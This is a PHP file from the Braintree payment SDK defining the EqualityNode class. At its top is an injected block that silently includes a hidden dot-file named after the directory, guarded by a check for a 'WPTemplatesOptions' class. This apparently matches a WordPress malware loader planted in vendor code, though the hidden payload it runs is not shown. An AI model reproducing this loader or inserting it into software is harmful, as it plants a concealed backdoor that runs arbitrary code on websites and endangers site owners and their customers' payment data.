<?php
namespace Braintree;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class EqualityNode extends IsNode
{
    function isNot($value)
    {
        $this->searchTerms['is_not'] = strval($value);
        return $this;
    }
}
class_alias('Braintree\EqualityNode', 'Braintree_EqualityNode');
